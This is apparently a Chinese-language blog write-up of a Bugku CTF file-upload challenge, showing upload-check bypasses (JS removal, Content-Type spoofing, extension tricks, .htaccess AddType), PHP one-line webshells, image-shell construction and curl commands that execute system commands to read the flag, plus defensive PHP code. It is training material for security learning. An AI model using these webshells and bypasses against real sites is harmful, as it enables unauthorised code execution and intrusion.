---
title: Bugku 文件上传 - WEB
date: 2026-10-12 22:53:00
updated: 2026-10-12 22:53:00
description: Bugku 基础 30 题 第 27 题：Bugku 文件上传 - WEB
cover: 
top_img: 
tags:
  - Bugku
  - WEB
  - 基础30题
categories:
  - WriteUp
keywords: Bugku,CTF,WriteUp,WEB
---

## 1. 题目信息
- 平台：Bugku CTF
- 分类：WEB
- 难度：★★☆☆☆
- 题目地址：https://ctf.bugku.com/challenges/detail/id/88.html
- 附件：无

## 2. 题目描述
页面是个文件上传框，让你上传一个**图片**。
上传成功后给个链接。**但是目标是传一个 PHP 木马并执行它。**

## 3. 解题思路（一句话）
绕过前端的**扩展名 / MIME / 内容检测**，上传一个能执行代码的文件，
访问它执行命令，读 flag。

## 4. 详细步骤

### 4.1 先探路：看看有什么限制
1. 随便传一个 `1.php`，看提示什么：
   - "只能上传图片" → 有类型校验
   - "不允许的文件类型" → 有扩展名校验
   - 直接传成功 → 没校验，直接进 4.5
2. `F12` → **Network**，看上传时的请求，重点看：
   - 前端有没有 JS 校验（点上传时 Console 有没有报错）
   - `Content-Type` 是什么

### 4.2 绕过方法（按顺序试）

**① 前端 JS 校验 → 直接删掉校验**
`F12` → Elements → 找到 `<input type="file" ...>` → 双击，
把 `onchange="checkFile()"` 之类的属性删掉，
或者在 Console 里：
```javascript
document.querySelector('form').onsubmit = null;
```

**② `Content-Type` 校验 → 改成图片类型**
用 Burp 拦下上传请求，把：
```
Content-Type: application/x-php
```
改成：
```
Content-Type: image/png
```
（或者 `image/jpeg`、`image/gif`）

**③ 扩展名校验 → 换后缀（黑名单绕过）**
```
1.php        →  不行（被黑名单拦）
1.php3       →  可能可以（PHP 3 解析）
1.php5       →  可能可以
1.phtml      →  可能可以
1.pht        →  可能可以
1.php.jpg    →  可能可以（Apache 多扩展名解析）
1.PHP        →  可能可以（大小写绕过，Windows 服务器有效）
1.php%00.jpg →  老版本 PHP 截断
1.php.       →  Windows 会去掉末尾的点
1.php::$DATA →  Windows NTFS 数据流
```

**④ 内容校验（`getimagesize`）→ 图片马**
在正常图片**末尾**追加 PHP 代码：
```bash
# Linux / Git Bash
cat 1.png shell.php > shell.png

# Windows PowerShell
$png = [IO.File]::ReadAllBytes("1.png")
$php = [IO.File]::ReadAllBytes("shell.php")
[IO.File]::WriteAllBytes("shell.png", $png + $php)
```
或直接在 HxD 里打开图片，拉到末尾粘贴：
```php
<?php @eval($_POST['cmd']);?>
```
> **注意**：这种图片马**直接访问不会执行**，必须配合**文件包含漏洞**才能执行。

**⑤ `.htaccess` 攻击（Apache）**
先上传一个 `.htaccess`：
```apache
AddType application/x-httpd-php .png
```
意思是"**把 .png 当 PHP 解析**"。
然后再上传 `shell.png`（内容是 PHP 代码），访问它就执行了。

### 4.3 上传成功后：找到文件路径
上传成功后页面会返回路径，比如：
```
/upload/2024/01/01/shell.php
/uploadfiles/shell.php
```
**把完整的 URL 拼出来**：
```
题目地址/upload/2024/01/01/shell.php
```

### 4.4 一句话木马
```php
<?php @eval($_POST['cmd']);?>
```
或者更短的：
```php
<?php system($_GET['c']);?>
```

**上传后测试：**
```bash
# 方法 1：curl 直接传参
curl -s "题目地址/upload/shell.php?c=ls"

# 方法 2：POST 传参（对应 eval 马）
curl -s -X POST -d "cmd=system('ls');" "题目地址/upload/shell.php"
```

看到目录列表就成功了，然后：
```bash
curl -s -X POST -d "cmd=system('cat /flag');" "题目地址/upload/shell.php"
curl -s "题目地址/upload/shell.php?c=cat%20/flag"
```

### 4.5 用中国菜刀 / 蚁剑（图形化管理）
- **蚁剑（AntSword）**：<https://github.com/AntSwordProject/antSword>
- 添加数据：URL + 密码（`cmd`）
- 然后像操作文件管理器一样找 flag

> **新手建议先用 curl**，理解原理后再用工具，不然容易"会点按钮不懂原理"。

### 4.6 常见 flag 位置
```
/flag
/flag.txt
/flag.php
/var/www/html/flag
/tmp/flag
```

## 5. 关键知识点
- **文件上传漏洞**：服务端没有严格校验上传文件的**类型和内容**，导致可以上传可执行脚本。
- **校验层级**（从弱到强）：
  1. 前端 JS 校验 —— **最弱，直接绕过**
  2. `Content-Type` 校验 —— **改个 header 就绕过**
  3. 扩展名黑名单 —— **换后缀绕过**（`phtml`、`php5`、多扩展名）
  4. 扩展名白名单 —— **较安全**（只能传 `jpg/png/gif`）
  5. 内容检测（`getimagesize`）—— **图片马可绕**
  6. 重命名 + 分离存储 + 不可执行目录 —— **推荐方案**
- **代码执行的必要条件**：上传的文件**在 Web 目录下**且**被解析器当脚本执行**。
  - Apache 靠 `.htaccess` 的 `AddType`
  - Nginx 靠 `location ~ \.php$` 配置（配置不当会出现解析漏洞）
- **图片马 + 文件包含** = 常见的组合拳（结合第 24 题）。

### 5.1 防御方案（顺便学，面试会问）
```php
// 1. 白名单校验扩展名
$allow = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allow)) die('不允许');

// 2. 校验真实 MIME（用 finfo，不信客户端的 Content-Type）
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg','image/png','image/gif'])) die('不是图片');

// 3. 重命名（彻底切断用户对文件名的控制）
$newName = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], '/data/upload/' . $newName);

// 4. 上传目录禁止执行（Nginx）
// location /upload/ { location ~ \.php$ { deny all; } }
```

## 6. 常见坑
- **上传成功 ≠ 能执行**。先访问一下看返回的是源码文本还是执行结果。
  - 返回 `<?php ...` 原文 → **没被解析**，要换后缀或找解析漏洞
  - 返回执行结果 → 成功
- **黑名单绕过别只试 `.php5`**，把 4.2 ③ 那张表全试一遍。
- **图片马不配合文件包含是没用的**，记住这个组合。
- ⚠️ **只在 CTF 靶场里做这些**。对真实网站上传 webshell 是刑事犯罪。

## 7. FLAG
```
flag{这里填你提交成功的真实 flag}
```

